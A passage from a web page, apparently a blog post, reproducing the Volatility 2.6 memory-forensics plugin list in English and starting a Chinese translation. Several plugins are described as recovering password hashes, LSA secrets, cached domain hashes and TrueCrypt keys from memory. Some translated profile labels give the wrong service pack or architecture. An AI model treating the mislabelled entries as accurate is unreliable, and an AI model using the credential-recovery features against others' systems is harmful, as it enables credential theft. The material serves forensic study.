installed GDI timers and callbacks</span><br><span class="line">gdt                        - Display Global Descriptor Table</span><br><span class="line">getservicesids             - Get the names of services in the Registry and return Calculated SID</span><br><span class="line">getsids                    - Print the SIDs owning each process</span><br><span class="line">handles                    - Print list of open handles for each process</span><br><span class="line">hashdump                   - Dumps passwords hashes (LM/NTLM) from memory</span><br><span class="line">hibinfo                    - Dump hibernation file information</span><br><span class="line">hivedump                   - Prints out a hive</span><br><span class="line">hivelist                   - Print list of registry hives.</span><br><span class="line">hivescan                   - Pool scanner for registry hives</span><br><span class="line">hpakextract                - Extract physical memory from an HPAK file</span><br><span class="line">hpakinfo                   - Info on an HPAK file</span><br><span class="line">idt                        - Display Interrupt Descriptor Table</span><br><span class="line">iehistory                  - Reconstruct Internet Explorer cache / history</span><br><span class="line">imagecopy                  - Copies a physical address space out as a raw DD image</span><br><span class="line">imageinfo                  - Identify information for the image</span><br><span class="line">impscan                    - Scan for calls to imported functions</span><br><span class="line">joblinks                   - Print process job link information</span><br><span class="line">kdbgscan                   - Search for and dump potential KDBG values</span><br><span class="line">kpcrscan                   - Search for and dump potential KPCR values</span><br><span class="line">ldrmodules                 - Detect unlinked DLLs</span><br><span class="line">limeinfo                   - Dump Lime file format information</span><br><span class="line">linux_apihooks             - Checks for userland apihooks</span><br><span class="line">linux_arp                  - Print the ARP table</span><br><span class="line">linux_aslr_shift           - Automatically detect the Linux ASLR shift</span><br><span class="line">linux_banner               - Prints the Linux banner information</span><br><span class="line">linux_bash                 - Recover bash history from bash process memory</span><br><span class="line">linux_bash_env             - Recover a process&#x27; dynamic environment variables</span><br><span class="line">linux_bash_hash            - Recover bash hash table from bash process memory</span><br><span class="line">linux_check_afinfo         - Verifies the operation function pointers of network protocols</span><br><span class="line">linux_check_creds          - Checks if any processes are sharing credential structures</span><br><span class="line">linux_check_evt_arm        - Checks the Exception Vector Table to look for syscall table hooking</span><br><span class="line">linux_check_fop            - Check file operation structures for rootkit modifications</span><br><span class="line">linux_check_idt            - Checks if the IDT has been altered</span><br><span class="line">linux_check_inline_kernel  - Check for inline kernel hooks</span><br><span class="line">linux_check_modules        - Compares module list to sysfs info, if available</span><br><span class="line">linux_check_syscall        - Checks if the system call table has been altered</span><br><span class="line">linux_check_syscall_arm    - Checks if the system call table has been altered</span><br><span class="line">linux_check_tty            - Checks tty devices for hooks</span><br><span class="line">linux_cpuinfo              - Prints info about each active processor</span><br><span class="line">linux_dentry_cache         - Gather files from the dentry cache</span><br><span class="line">linux_dmesg                - Gather dmesg buffer</span><br><span class="line">linux_dump_map             - Writes selected memory mappings to disk</span><br><span class="line">linux_dynamic_env          - Recover a process&#x27; dynamic environment variables</span><br><span class="line">linux_elfs                 - Find ELF binaries in process mappings</span><br><span class="line">linux_enumerate_files      - Lists files referenced by the filesystem cache</span><br><span class="line">linux_find_file            - Lists and recovers files from memory</span><br><span class="line">linux_getcwd               - Lists current working directory of each process</span><br><span class="line">linux_hidden_modules       - Carves memory to find hidden kernel modules</span><br><span class="line">linux_ifconfig             - Gathers active interfaces</span><br><span class="line">linux_info_regs            - It&#x27;s like &#x27;info registers&#x27; in GDB. It prints out all the</span><br><span class="line">linux_iomem                - Provides output similar to /proc/iomem</span><br><span class="line">linux_kernel_opened_files  - Lists files that are opened from within the kernel</span><br><span class="line">linux_keyboard_notifiers   - Parses the keyboard notifier call chain</span><br><span class="line">linux_ldrmodules           - Compares the output of proc maps with the list of libraries from libdl</span><br><span class="line">linux_library_list         - Lists libraries loaded into a process</span><br><span class="line">linux_librarydump          - Dumps shared libraries in process memory to disk</span><br><span class="line">linux_list_raw             - List applications with promiscuous sockets</span><br><span class="line">linux_lsmod                - Gather loaded kernel modules</span><br><span class="line">linux_lsof                 - Lists file descriptors and their path</span><br><span class="line">linux_malfind              - Looks for suspicious process mappings</span><br><span class="line">linux_memmap               - Dumps the memory map for linux tasks</span><br><span class="line">linux_moddump              - Extract loaded kernel modules</span><br><span class="line">linux_mount                - Gather mounted fs/devices</span><br><span class="line">linux_mount_cache          - Gather mounted fs/devices from kmem_cache</span><br><span class="line">linux_netfilter            - Lists Netfilter hooks</span><br><span class="line">linux_netscan              - Carves for network connection structures</span><br><span class="line">linux_netstat              - Lists open sockets</span><br><span class="line">linux_pidhashtable         - Enumerates processes through the PID hash table</span><br><span class="line">linux_pkt_queues           - Writes per-process packet queues out to disk</span><br><span class="line">linux_plthook              - Scan ELF binaries&#x27; PLT for hooks to non-NEEDED images</span><br><span class="line">linux_proc_maps            - Gathers process memory maps</span><br><span class="line">linux_proc_maps_rb         - Gathers process maps for linux through the mappings red-black tree</span><br><span class="line">linux_procdump             - Dumps a process&#x27;s executable image to disk</span><br><span class="line">linux_process_hollow       - Checks for signs of process hollowing</span><br><span class="line">linux_psaux                - Gathers processes along with full command line and start time</span><br><span class="line">linux_psenv                - Gathers processes along with their static environment variables</span><br><span class="line">linux_pslist               - Gather active tasks by walking the task_struct-&gt;task list</span><br><span class="line">linux_pslist_cache         - Gather tasks from the kmem_cache</span><br><span class="line">linux_psscan               - Scan physical memory for processes</span><br><span class="line">linux_pstree               - Shows the parent/child relationship between processes</span><br><span class="line">linux_psxview              - Find hidden processes with various process listings</span><br><span class="line">linux_recover_filesystem   - Recovers the entire cached file system from memory</span><br><span class="line">linux_route_cache          - Recovers the routing cache from memory</span><br><span class="line">linux_sk_buff_cache        - Recovers packets from the sk_buff kmem_cache</span><br><span class="line">linux_slabinfo             - Mimics /proc/slabinfo on a running machine</span><br><span class="line">linux_strings              - Match physical offsets to virtual addresses (may take a while, VERY verbose)</span><br><span class="line">linux_threads              - Prints threads of processes</span><br><span class="line">linux_tmpfs                - Recovers tmpfs filesystems from memory</span><br><span class="line">linux_truecrypt_passphrase - Recovers cached Truecrypt passphrases</span><br><span class="line">linux_vma_cache            - Gather VMAs from the vm_area_struct cache</span><br><span class="line">linux_volshell             - Shell in the memory image</span><br><span class="line">linux_yarascan             - A shell in the Linux memory image</span><br><span class="line">lsadump                    - Dump (decrypted) LSA secrets from the registry</span><br><span class="line">mac_adium                  - Lists Adium messages</span><br><span class="line">mac_apihooks               - Checks for API hooks in processes</span><br><span class="line">mac_apihooks_kernel        - Checks to see if system call and kernel functions are hooked</span><br><span class="line">mac_arp                    - Prints the arp table</span><br><span class="line">mac_bash                   - Recover bash history from bash process memory</span><br><span class="line">mac_bash_env               - Recover bash&#x27;s environment variables</span><br><span class="line">mac_bash_hash              - Recover bash hash table from bash process memory</span><br><span class="line">mac_calendar               - Gets calendar events from Calendar.app</span><br><span class="line">mac_check_fop              - Validate File Operation Pointers</span><br><span class="line">mac_check_mig_table        - Lists entires in the kernel&#x27;s MIG table</span><br><span class="line">mac_check_syscall_shadow   - Looks for shadow system call tables</span><br><span class="line">mac_check_syscalls         - Checks to see if system call table entries are hooked</span><br><span class="line">mac_check_sysctl           - Checks for unknown sysctl handlers</span><br><span class="line">mac_check_trap_table       - Checks to see if mach trap table entries are hooked</span><br><span class="line">mac_compressed_swap        - Prints Mac OS X VM compressor stats and dumps all compressed pages</span><br><span class="line">mac_contacts               - Gets contact names from Contacts.app</span><br><span class="line">mac_dead_procs             - Prints terminated/de-allocated processes</span><br><span class="line">mac_dead_sockets           - Prints terminated/de-allocated network sockets</span><br><span class="line">mac_dead_vnodes            - Lists freed vnode structures</span><br><span class="line">mac_devfs                  - Lists files in the file cache</span><br><span class="line">mac_dmesg                  - Prints the kernel debug buffer</span><br><span class="line">mac_dump_file              - Dumps a specified file</span><br><span class="line">mac_dump_maps              - Dumps memory ranges of process(es), optionally including pages in compressed swap</span><br><span class="line">mac_dyld_maps              - Gets memory maps of processes from dyld data structures</span><br><span class="line">mac_find_aslr_shift        - Find the ASLR shift value for 10.8+ images</span><br><span class="line">mac_get_profile            - Automatically detect Mac profiles</span><br><span class="line">mac_ifconfig               - Lists network interface information for all devices</span><br><span class="line">mac_interest_handlers      - Lists IOKit Interest Handlers</span><br><span class="line">mac_ip_filters             - Reports any hooked IP filters</span><br><span class="line">mac_kernel_classes         - Lists loaded c++ classes in the kernel</span><br><span class="line">mac_kevents                - Show parent/child relationship of processes</span><br><span class="line">mac_keychaindump           - Recovers possbile keychain keys. Use chainbreaker to open related keychain files</span><br><span class="line">mac_ldrmodules             - Compares the output of proc maps with the list of libraries from libdl</span><br><span class="line">mac_librarydump            - Dumps the executable of a process</span><br><span class="line">mac_list_files             - Lists files in the file cache</span><br><span class="line">mac_list_kauth_listeners   - Lists Kauth Scope listeners</span><br><span class="line">mac_list_kauth_scopes      - Lists Kauth Scopes and their status</span><br><span class="line">mac_list_raw               - List applications with promiscuous sockets</span><br><span class="line">mac_list_sessions          - Enumerates sessions</span><br><span class="line">mac_list_zones             - Prints active zones</span><br><span class="line">mac_lsmod                  - Lists loaded kernel modules</span><br><span class="line">mac_lsmod_iokit            - Lists loaded kernel modules through IOkit</span><br><span class="line">mac_lsmod_kext_map         - Lists loaded kernel modules</span><br><span class="line">mac_lsof                   - Lists per-process opened files</span><br><span class="line">mac_machine_info           - Prints machine information about the sample</span><br><span class="line">mac_malfind                - Looks for suspicious process mappings</span><br><span class="line">mac_memdump                - Dump addressable memory pages to a file</span><br><span class="line">mac_moddump                - Writes the specified kernel extension to disk</span><br><span class="line">mac_mount                  - Prints mounted device information</span><br><span class="line">mac_netstat                - Lists active per-process network connections</span><br><span class="line">mac_network_conns          - Lists network connections from kernel network structures</span><br><span class="line">mac_notesapp               - Finds contents of Notes messages</span><br><span class="line">mac_notifiers              - Detects rootkits that add hooks into I/O Kit (e.g. LogKext)</span><br><span class="line">mac_orphan_threads         - Lists threads that don&#x27;t map back to known modules/processes</span><br><span class="line">mac_pgrp_hash_table        - Walks the process group hash table</span><br><span class="line">mac_pid_hash_table         - Walks the pid hash table</span><br><span class="line">mac_print_boot_cmdline     - Prints kernel boot arguments</span><br><span class="line">mac_proc_maps              - Gets memory maps of processes</span><br><span class="line">mac_procdump               - Dumps the executable of a process</span><br><span class="line">mac_psaux                  - Prints processes with arguments in user land (**argv)</span><br><span class="line">mac_psenv                  - Prints processes with environment in user land (**envp)</span><br><span class="line">mac_pslist                 - List Running Processes</span><br><span class="line">mac_pstree                 - Show parent/child relationship of processes</span><br><span class="line">mac_psxview                - Find hidden processes with various process listings</span><br><span class="line">mac_recover_filesystem     - Recover the cached filesystem</span><br><span class="line">mac_route                  - Prints the routing table</span><br><span class="line">mac_socket_filters         - Reports socket filters</span><br><span class="line">mac_strings                - Match physical offsets to virtual addresses (may take a while, VERY verbose)</span><br><span class="line">mac_tasks                  - List Active Tasks</span><br><span class="line">mac_threads                - List Process Threads</span><br><span class="line">mac_threads_simple         - Lists threads along with their start time and priority</span><br><span class="line">mac_timers                 - Reports timers set by kernel drivers</span><br><span class="line">mac_trustedbsd             - Lists malicious trustedbsd policies</span><br><span class="line">mac_version                - Prints the Mac version</span><br><span class="line">mac_vfsevents              - Lists processes filtering file system events</span><br><span class="line">mac_volshell               - Shell in the memory image</span><br><span class="line">mac_yarascan               - Scan memory for yara signatures</span><br><span class="line">machoinfo                  - Dump Mach-O file format information</span><br><span class="line">malfind                    - Find hidden and injected code</span><br><span class="line">mbrparser                  - Scans for and parses potential Master Boot Records (MBRs)</span><br><span class="line">memdump                    - Dump the addressable memory for a process</span><br><span class="line">memmap                     - Print the memory map</span><br><span class="line">messagehooks               - List desktop and thread window message hooks</span><br><span class="line">mftparser                  - Scans for and parses potential MFT entries</span><br><span class="line">moddump                    - Dump a kernel driver to an executable file sample</span><br><span class="line">modscan                    - Pool scanner for kernel modules</span><br><span class="line">modules                    - Print list of loaded modules</span><br><span class="line">multiscan                  - Scan for various objects at once</span><br><span class="line">mutantscan                 - Pool scanner for mutex objects</span><br><span class="line">netscan                    - Scan a Vista (or later) image for connections and sockets</span><br><span class="line">notepad                    - List currently displayed notepad text</span><br><span class="line">objtypescan                - Scan for Windows object type objects</span><br><span class="line">patcher                    - Patches memory based on page scans</span><br><span class="line">poolpeek                   - Configurable pool scanner plugin</span><br><span class="line">pooltracker                - Show a summary of pool tag usage</span><br><span class="line">printkey                   - Print a registry key, and its subkeys and values</span><br><span class="line">privs                      - Display process privileges</span><br><span class="line">procdump                   - Dump a process to an executable file sample</span><br><span class="line">pslist                     - Print all running processes by following the EPROCESS lists</span><br><span class="line">psscan                     - Pool scanner for process objects</span><br><span class="line">pstree                     - Print process list as a tree</span><br><span class="line">psxview                    - Find hidden processes with various process listings</span><br><span class="line">qemuinfo                   - Dump Qemu information</span><br><span class="line">raw2dmp                    - Converts a physical memory sample to a windbg crash dump</span><br><span class="line">screenshot                 - Save a pseudo-screenshot based on GDI windows</span><br><span class="line">servicediff                - List Windows services (ala Plugx)</span><br><span class="line">sessions                   - List details on _MM_SESSION_SPACE (user logon sessions)</span><br><span class="line">shellbags                  - Prints ShellBags info</span><br><span class="line">shimcache                  - Parses the Application Compatibility Shim Cache registry key</span><br><span class="line">shutdowntime               - Print ShutdownTime of machine from registry</span><br><span class="line">sockets                    - Print list of open sockets</span><br><span class="line">sockscan                   - Pool scanner for tcp socket objects</span><br><span class="line">ssdt                       - Display SSDT entries</span><br><span class="line">strings                    - Match physical offsets to virtual addresses (may take a while, VERY verbose)</span><br><span class="line">svcscan                    - Scan for Windows services</span><br><span class="line">symlinkscan                - Pool scanner for symlink objects</span><br><span class="line">thrdscan                   - Pool scanner for thread objects</span><br><span class="line">threads                    - Investigate _ETHREAD and _KTHREADs</span><br><span class="line">timeliner                  - Creates a timeline from various artifacts in memory</span><br><span class="line">timers                     - Print kernel timers and associated module DPCs</span><br><span class="line">truecryptmaster            - Recover TrueCrypt 7.1a Master Keys</span><br><span class="line">truecryptpassphrase        - TrueCrypt Cached Passphrase Finder</span><br><span class="line">truecryptsummary           - TrueCrypt Summary</span><br><span class="line">unloadedmodules            - Print list of unloaded modules</span><br><span class="line">userassist                 - Print userassist registry keys and information</span><br><span class="line">userhandles                - Dump the USER handle tables</span><br><span class="line">vaddump                    - Dumps out the vad sections to a file</span><br><span class="line">vadinfo                    - Dump the VAD info</span><br><span class="line">vadtree                    - Walk the VAD tree and display in tree format</span><br><span class="line">vadwalk                    - Walk the VAD tree</span><br><span class="line">vboxinfo                   - Dump virtualbox information</span><br><span class="line">verinfo                    - Prints out the version information from PE images</span><br><span class="line">vmwareinfo                 - Dump VMware VMSS/VMSN information</span><br><span class="line">volshell                   - Shell in the memory image</span><br><span class="line">win10cookie                - Find the ObHeaderCookie value for Windows 10</span><br><span class="line">windows                    - Print Desktop Windows (verbose details)</span><br><span class="line">wintree                    - Print Z-Order Desktop Windows Tree</span><br><span class="line">wndscan                    - Pool scanner for window stations</span><br><span class="line">yarascan                   - Scan process or kernel memory with Yara signatures</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Scanner Checks</span><br><span class="line">--------------</span><br><span class="line">CheckPoolSize          - Check pool block size</span><br><span class="line">CheckPoolType          - Check the pool type</span><br><span class="line">KPCRScannerCheck       - Checks the self referential pointers to find KPCRs</span><br><span class="line">MultiPrefixFinderCheck - Checks for multiple strings per page, finishing at the offset</span><br><span class="line">MultiStringFinderCheck - Checks for multiple strings per page</span><br><span class="line">PoolTagCheck           - This scanner checks for the occurance of a pool tag</span><br></pre></td></tr></table></figure><h5 id="中文-1"><a href="#中文-1" class="headerlink" title="中文"></a>中文</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br></pre></td><td class="code"><pre><span class="line">Volatility Foundation Volatility Framework 2.6</span><br><span class="line"></span><br><span class="line">Profiles</span><br><span class="line">--------</span><br><span class="line">VistaSP0x64           - Windows Vista SP0 x64 的配置文件</span><br><span class="line">VistaSP0x86           - Windows Vista SP0 x86 的配置文件</span><br><span class="line">VistaSP1x64           - Windows Vista SP1 x64 的配置文件</span><br><span class="line">VistaSP1x86           - Windows Vista SP1 x86 的配置文件</span><br><span class="line">VistaSP2x64           - Windows Vista SP1 x86 的配置文件</span><br><span class="line">VistaSP2x86           - Windows Vista SP2 x64 的配置文件 </span><br><span class="line">Win10x64              - Windows 10 x64 的配置文件 </span><br><span class="line">Win10x64_10586        - Windows 10 x64 的配置文件 (10.0.10586.306 / 2016-04-23)</span><br><span class="line">Win10x64_14393        - Windows 10 x64 的配置文件 (10.0.14393.0 / 2016-07-16)</span><br><span class="line">Win10x86              - Windows 10 x86 的配置文件</span><br><span class="line">Win10x86_10586        - Windows 10 x86 的配置文件 (10.0.10586.420 / 2016-05-28)</span><br><span class="line">Win10x86_14393        - Windows 10 x86 的配置文件 (10.0.14393.0 / 2016-07-16)</span><br><span class="line">Win2003SP0x86         - Windows 2003 SP0 x86 的配置文件</span><br><span class="line">Win2003SP1x64         - Windows 2003 SP0 x86 的配置文件</span><br><span class="line">Win2003SP1x86         - Windows 2003 SP1 x86 的配置文件 </span><br><span class="line">Win2003SP2x64         - Windows 2003 SP1 x86 的配置文件 </span><br><span class="line">Win2003SP2x86         - Windows 2003 SP2 x86 的配置文件 </span><br><span class="line">Win2008R2SP0x64       - Windows 2008 R2 SP0 x64 的配置文件</span><br><span class="line">Win2008R2SP1x64       - Windows 2008 R2 SP1 x64 的配置文件</span><br><span class="line">Win2008R2SP1x64_23418 - Windows 2008 R2 SP1 x64 的配置文件 (6.1.7601.23418 / 2016-04-09)</span><br><span class="line">Win2008SP1x64         - Windows 2008 SP1 x64 的配置文件</span><br><span class="line">Win2008SP1x86         - Windows 2008 SP1 x86 的配置文件</span><br><span class="line">Win2008SP2x64         - Windows 2008 SP2 x64 的配置文件</span><br><span class="line">Win2008SP2x86         - Windows 2008 SP2 x86 的配置文件</span><br><span class="line">Win2012R2x64          - Windows Server 2012 R2 x64 的配置文件</span><br><span class="line">Win2012R2x64_18340    - Windows Server 2012 R2 x64 的配置文件 (6.3.9600.18340 / 2016-05-13)</span><br><span class="line">Win2012x64            - Windows Server 2012 x64 的配置文件</span><br><span class="line">Win2016x64_14393      - Windows Server 2016 x64 的配置文件 (10.0.14393.0 / 2016-07-16)</span><br><span class="line">Win7SP0x64            - Windows 7 SP0 x64 的配置文件</span><br><span class="line">Win7SP0x86            - Windows 7 SP0 x86 的配置文件</span><br><span class="line">Win7SP1x64            - Windows 7 SP1 x64 的配置文件</span><br><span class="line">Win7SP1x64_23418      - Windows 7 SP1 x64 的配置文件 (6.1.7601.23418 / 2016-04-09)</span><br><span class="line">Win7SP1x86            - Windows 7 SP1 x86 的配置文件</span><br><span class="line">Win7SP1x86_23418      - Windows 7 SP1 x86 的配置文件 (6.1.7601.23418 / 2016-04-09)</span><br><span class="line">Win81U1x64            - Windows 8.1 更新 1 x64 的配置文件</span><br><span class="line">Win81U1x86            - Windows 8.1 更新 1 x86 的配置文件</span><br><span class="line">Win8SP0x64            - Windows 8 x64 的配置文件</span><br><span class="line">Win8SP0x86            - Windows 8 x86 的配置文件</span><br><span class="line">Win8SP1x64            - Windows 8.1 x64 的配置文件</span><br><span class="line">Win8SP1x64_18340      - Windows 8.1 x64 的配置文件 (6.3.9600.18340 / 2016-05-13)</span><br><span class="line">Win8SP1x86            - Windows 8.1 x86 的配置文件</span><br><span class="line">WinXPSP1x64           - Windows XP SP1 x64 的配置文件</span><br><span class="line">WinXPSP2x64           - Windows XP SP2 x64 的配置文件</span><br><span class="line">WinXPSP2x86           - Windows XP SP2 x86 的配置文件</span><br><span class="line">WinXPSP3x86           - Windows XP SP3 x86 的配置文件</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Address Spaces</span><br><span class="line">--------------</span><br><span class="line">AMD64PagedMemory              - 标准 AMD 64 位地址空间</span><br><span class="line">ArmAddressSpace               - ARM 处理器的地址空间</span><br><span class="line">FileAddressSpace              - 这是一个直接文件 AS.</span><br><span class="line">HPAKAddressSpace              - 此 AS 支持 HPAK 格式</span><br><span class="line">IA32PagedMemory               - 标准 IA-32 分页地址空间</span><br><span class="line">IA32PagedMemoryPae            - 此类实现 IA-32 PAE 分页地址空间</span><br><span class="line">LimeAddressSpace              - Lime 的地址空间</span><br><span class="line">LinuxAMD64PagedMemory         - Linux 特定的 AMD 64 位地址空间</span><br><span class="line">MachOAddressSpace             - mach-o 文件的地址空间以支持 atc-ny 内存读取器</span><br><span class="line">OSXPmemELF                    - 这个 AS 支持 VirtualBox ELF64 coredump 格式</span><br><span class="line">QemuCoreDumpElf               - 这个 AS 支持 Qemu ELF32 和 ELF64 核心转储格式</span><br><span class="line">VMWareAddressSpace            - 此 AS 支持 VMware 快照 (VMSS) 和保存状态 (VMSS) 文件 </span><br><span class="line">VMWareMetaAddressSpace        - 此 AS 支持带有 VMSN/VMSS 元数据的 VMEM 格式 </span><br><span class="line">VirtualBoxCoreDumpElf64       - 这个 AS 支持 VirtualBox ELF64 coredump 格式</span><br><span class="line">Win10AMD64PagedMemory         - Windows 10 特定的 AMD 64 位地址空间</span><br><span class="line">WindowsAMD64PagedMemory       - Windows 特定的 AMD 64 位地址空间</span><br><span class="line">WindowsCrashDumpSpace32       - 这个 AS 支持 windows 崩溃转储格式</span><br><span class="line">WindowsCrashDumpSpace64       - 此 AS 支持 windows Crash Dump 格式</span><br><span class="line">WindowsCrashDumpSpace64BitMap - 此 AS 支持 Windows BitMap Crash Dump 格式</span><br><span class="line">WindowsHiberFileSpace32       - 这是 Windows 休眠文件的休眠地址空间</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Plugins</span><br><span class="line">-------</span><br><span class="line">amcache                    - 打印 AmCache 信息 </span><br><span class="line">apihooks                   - 检测进程和内核内存中的 API 挂钩 </span><br><span class="line">atoms                      - 打印会话和窗口站原子表</span><br><span class="line">atomscan                   - 原子表的池扫描器</span><br><span class="line">auditpol                   - 从 HKLM\SECURITY\Policy\PolAdtEv 打印出审计策略 </span><br><span class="line">bigpools                   - 使用 BigPagePoolScanner 转储大页面池 </span><br><span class="line">bioskbd                    - 从实模式内存中读取键盘缓冲区</span><br><span class="line">cachedump                  - 从内存中转储缓存的域哈希</span><br><span class="line">callbacks                  - 打印系统范围的通知例程</span><br><span class="line">clipboard                  - 提取 Windows 剪贴板的内容</span><br><span 